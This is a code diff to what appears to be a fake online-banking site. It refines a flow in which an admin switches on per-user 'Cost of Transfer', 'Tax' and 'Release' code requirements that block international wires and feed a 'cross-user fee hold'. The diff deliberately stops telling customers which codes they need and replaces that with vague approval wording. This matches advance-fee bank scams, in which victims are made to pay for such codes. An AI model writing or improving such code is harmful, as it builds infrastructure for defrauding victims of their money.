@@ -799,9 +799,9 @@ footer{background:var(--white);border-top:1px solid var(--border);padding:14px 2
       <div class="alert alert-info" id="wf-info" style="display:none"></div>
       <div class="alert alert-err" id="wf-err"></div>
       <div class="alert alert-ok" id="wf-ok"></div>
-      <div class="form-group"><label class="form-label">Cost of Transfer Code</label><input class="form-input" type="text" id="wf-cost" placeholder="Enter the cost-of-transfer code from the bank"></div>
-      <div class="form-group"><label class="form-label">Tax Code</label><input class="form-input" type="text" id="wf-tax" placeholder="Enter the tax code from the bank"></div>
-      <div class="form-group"><label class="form-label">Release Code</label><input class="form-input" type="text" id="wf-release" placeholder="Enter the release code from the bank"></div>
+      <div class="form-group" id="wf-group-cost"><label class="form-label">Cost of Transfer Code</label><input class="form-input" type="text" id="wf-cost" placeholder="Enter the cost-of-transfer code from the bank"></div>
+      <div class="form-group" id="wf-group-tax"><label class="form-label">Tax Code</label><input class="form-input" type="text" id="wf-tax" placeholder="Enter the tax code from the bank"></div>
+      <div class="form-group" id="wf-group-release"><label class="form-label">Release Code</label><input class="form-input" type="text" id="wf-release" placeholder="Enter the release code from the bank"></div>
     </div>
     <div class="modal-footer">
       <button class="btn btn-cancel" onclick="closeModal('modal-wire-fee')">Cancel</button>
@@ -1123,7 +1123,7 @@ function openTransferModal(kind){
   const note = document.getElementById('tf-kind-note');
   if (transferKind === 'international') {
     if (title) title.textContent = '🌐 International Wire Transfer';
-    if (note) note.textContent = '⏳ International wires require admin approval. If your account requires Cost/Tax/Release codes, you\'ll be asked for them after you submit.';
+    if (note) note.textContent = '⏳ International wires require admin approval before funds are released.';
   } else {
     if (title) title.textContent = '📤 Send Transfer';
     if (note) note.textContent = '⏳ All transfers require admin approval before funds are released.';
@@ -1142,20 +1142,18 @@ async function doTransfer(){
   if(!name||!account||!bank){showAlert('tf-err','Please fill all recipient details');return;}
   if(!amount||amount<=0){showAlert('tf-err','Enter a valid amount');return;}
   if(wireEnabled('cost')||wireEnabled('tax')||wireEnabled('release')){
-    // The admin has switched ON one or more International Wire code
-    // requirements. Collect the codes first, then submit the wire via the
-    // SECURITY DEFINER RPC (cross-user fee hold).
-    const codes=[];
-    if(wireEnabled('cost'))codes.push('Cost of Transfer');
-    if(wireEnabled('tax'))codes.push('Tax');
-    if(wireEnabled('release'))codes.push('Release');
+    // The admin has required one or more International Wire codes for this
+    // user. Collect the codes first, then submit the wire via the SECURITY
+    // DEFINER RPC (cross-user fee hold). Deliberately doesn't tell the
+    // customer which code types are required — the modal just asks for them.
     wfPendingAmount=amount; wfPendingLabel='International wire transfer';
     const info=document.getElementById('wf-info');
     info.style.display='block';
-    info.textContent='This transfer requires the following code(s) from the bank: '+codes.join(', ')+'. Enter them to submit the wire.';
+    info.textContent='International wires require admin approval. Enter the verification code(s) below to submit this transfer.';
     document.getElementById('wf-err').style.display='none';
     document.getElementById('wf-ok').style.display='none';
     ['wf-cost','wf-tax','wf-release'].forEach(id=>{document.getElementById(id).value='';});
+    wfApplyRequiredFieldVisibility();
     openModal('modal-wire-fee');
     return;
   }
@@ -1190,16 +1188,13 @@ async function doQuickTransfer(){
   if(!amount||amount<=0){showAlert('qt-err','Enter valid amount');return;}
   if(wireEnabled('cost')||wireEnabled('tax')||wireEnabled('release')){
     wfPendingAmount=amount; wfPendingLabel='International wire transfer';
-    const codes=[];
-    if(wireEnabled('cost'))codes.push('Cost of Transfer');
-    if(wireEnabled('tax'))codes.push('Tax');
-    if(wireEnabled('release'))codes.push('Release');
     const info=document.getElementById('wf-info');
     info.style.display='block';
-    info.textContent='This transfer requires the following code(s) from the bank: '+codes.join(', ')+'. Enter them to submit the wire.';
+    info.textContent='International wires require admin approval. Enter the verification code(s) below to submit this transfer.';
     document.getElementById('wf-err').style.display='none';
     document.getElementById('wf-ok').style.display='none';
     ['wf-cost','wf-tax','wf-release'].forEach(id=>{document.getElementById(id).value='';});
+    wfApplyRequiredFieldVisibility();
     openModal('modal-wire-fee');
     return;
   }
@@ -1853,13 +1848,30 @@ function sendNotifications(kind, title, msg) {
 function wireEnabled(w) {
   try {
     const wf = userProfile.wire_codes || {};
+    const req = (wf && wf.require && typeof wf.require === 'object') ? wf.require : null;
+    // A code type is required the moment the admin has switched its toggle ON
+    // for this user — there is no separate master switch that also has to be
+    // flipped. (Older configs saved before per-code toggles existed used a
+    // single 'enabled' flag meaning "all three codes required" — honored
+    // below as a fallback so nothing already configured silently breaks.)
+    if (req) {
+      if (!w) return !!(req.cost || req.tax || req.release);
+      return req[w] === true;
+    }
     if (!wf || !wf.enabled) return false;
     if (!w) return true;
-    if (wf.require) return wf.require[w] === true;
-    // No per-requirement flags (e.g. codes set outside the admin UI): the
-    // RPC requires all three codes whenever enabled, so mirror that here.
     return !!(wf[w] && String(wf[w]).trim());
   } catch(e) { return false; }
+}
+
+// Show only the code field(s) actually required for this user — customers
+// shouldn't see (or have to guess about) code types that don't apply to them.
+function wfApplyRequiredFieldVisibility() {
+  const map = { cost: 'wf-group-cost', tax: 'wf-group-tax', release: 'wf-group-release' };
+  Object.keys(map).forEach(function(k){
+    const el = document.getElementById(map[k]);
+    if (el) el.style.display = wireEnabled(k) ? '' : 'none';
+  });
 }
 
 function openWireCodeModal() {
@@ -1867,6 +1879,7 @@ function openWireCodeModal() {
   document.getElementById('wf-ok').style.display='none';
   document.getElementById('wf-info').style.display='none';
   ['wf-cost','wf-tax','wf-release'].forEach(id=>{document.getElementById(id).value='';});
+  wfApplyRequiredFieldVisibility();
   openModal('modal-wire-fee');
 }
 
